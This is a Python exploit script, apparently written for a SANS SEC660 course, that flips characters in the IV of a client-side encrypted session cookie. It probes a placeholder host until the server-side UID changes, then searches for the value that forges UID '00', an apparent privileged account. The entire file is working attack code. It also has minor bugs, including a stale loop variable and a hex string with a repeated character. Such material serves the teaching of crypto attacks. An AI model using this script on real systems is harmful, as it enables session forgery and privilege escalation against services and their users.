#!/usr/bin/python3
#Flip bits to exploit a client side encrypted session mechanism
#Written for SANS SEC660 by Cary Hooper 11/18/2021
import requests
import urllib.parse
import sys, warnings, bs4
warnings.filterwarnings("ignore")

#Make initial request to get IV and encrypted session data
host = "http://insert-host-here/session-handler.php"
s = requests.Session()
response = s.get(host)
redirect_url = urllib.parse.urlparse(response.url)
redirect_params = urllib.parse.parse_qs(redirect_url.query)
params = dict()

for key in redirect_params.keys():
	params[key] = redirect_params[key][0]
print(params)

if "iv" not in params.keys():
	print("Error getting parameters...")
	sys.exit(1)

def check_change(text_response, need_exact=False):
	#print(response.text)
	#Checks to see if our UID has changed... may need to make an additional request.
	soup = bs4.BeautifulSoup(text_response,"html.parser")
	results = soup.find_all('p')
	result = results[0]
	if '=' not in result.text or '.' not in result.text:
		return False
	UID = result.text.split('=')[1].split('.')[0]
	if len(UID) != 2:
		return False

	if need_exact == False:
		if UID != "20":
			print(f"UID Changed! {UID}")
			return True
	else:
		if UID == "00":
			print(f"found IV for UID 00!")
			return True
	return False

def do_request(new_iv):
	#make the request and return the HTML.
	flipped_params = params
	flipped_params["iv"] = new_iv
	response = s.get(host,params=flipped_params)
	return response.text

indices = list()

#Iterate through each index to see if it changes the UID
iv = params["iv"]
for i in range(0,len(iv)):
	char = params["iv"][i]
	if char != '0':
		newchar = '0'
	else:
		newchar = '1'
	new_iv = iv[0:i] + newchar + iv[i+1:]
	# print(f"Testing new IV: {new_iv}")
	response_text = do_request(new_iv)
	is_changed = check_change(response_text)
	if is_changed:
		print(f"Changing the character at index {i} resulted in a change to the UID!")
		indices.append(i)

# sys.exit(1)

#Iterate through all hex characters to see which characters result in UID of 00.
#Note: there is an easier way to do this since it is a simple XOR and XOR is commutative.  
for index in indices:
	for newchar in "01232456789abcdef".replace(char,""):
		new_iv = iv[0:index] + newchar + iv[index+1:]
		response_text = do_request(new_iv)
		is_changed = check_change(response_text, need_exact=True)
		if is_changed:
			print(f"{new_iv} resulted in UID of 00") 
		